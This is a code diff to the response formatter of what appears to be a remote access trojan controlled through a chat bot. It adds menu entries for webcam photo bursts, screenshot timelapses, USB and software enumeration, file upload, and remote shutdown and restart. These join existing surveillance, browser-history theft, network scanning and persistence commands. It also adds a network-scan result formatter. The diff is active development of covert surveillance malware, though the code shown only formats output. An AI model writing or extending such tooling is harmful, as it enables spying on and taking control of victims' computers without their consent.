@@ -212,6 +212,8 @@ export class ResponseFormatter {
 /sysinfo - System information
 /processes - Running processes
 /metrics - Performance metrics
+/software - Installed software
+/usb - USB devices
 
 *📸 SURVEILLANCE*
 /screenshot - Capture screen
@@ -227,7 +229,7 @@ export class ResponseFormatter {
 /history <browser> - Browser history
 
 *⚙️ PROCESS CONTROL*
-/kill <pid> - Kill process
+/killproc <pid> - Kill process
 
 *🌐 NETWORK*
 /netscan - Scan network
@@ -235,12 +237,19 @@ export class ResponseFormatter {
 
 *💾 FILES*
 /download <path> - Download file
-/software - Installed programs
+/upload <path> - Upload file
+
+*📷 ADVANCED CAPTURE*
+/timelapse <count> <interval> - Screenshot timelapse
+/photoburst <count> - Multiple webcam photos
+/usblist - List USB devices
 
 *🎮 FUN FEATURES*
-/msgbox <title>|<msg> - Show message
-/beep - Play beep sound
+/msgbox <msg> - Show message
+/beep [freq] [dur] - Play beep
 /lock - Lock screen
+/shutdown - Shutdown system
+/restart - Restart system
 
 *🛡️ PERSISTENCE*
 /persist - Add persistence
@@ -257,6 +266,34 @@ export class ResponseFormatter {
 /ping - Check bot status`;
     
     return help;
+  }
+
+  /**
+   * Format network scan results
+   */
+  static networkScan(data) {
+    let formatted = this.header('🌐', 'NETWORK SCAN RESULTS');
+    formatted += '\n\n';
+    
+    try {
+      const results = typeof data === 'string' ? data.split('\n') : data;
+      const filtered = (Array.isArray(results) ? results : [results])
+        .filter(r => r && r.trim())
+        .slice(0, 20);
+      
+      if (filtered.length === 0) {
+        formatted += '❌ No devices found on network';
+      } else {
+        formatted += `✅ Found ${filtered.length} active hosts:\n\n`;
+        filtered.forEach((host, idx) => {
+          formatted += `${idx + 1}. \`${host.trim()}\`\n`;
+        });
+      }
+    } catch {
+      formatted += '```' + data + '```';
+    }
+    
+    return formatted;
   }
 
   /**
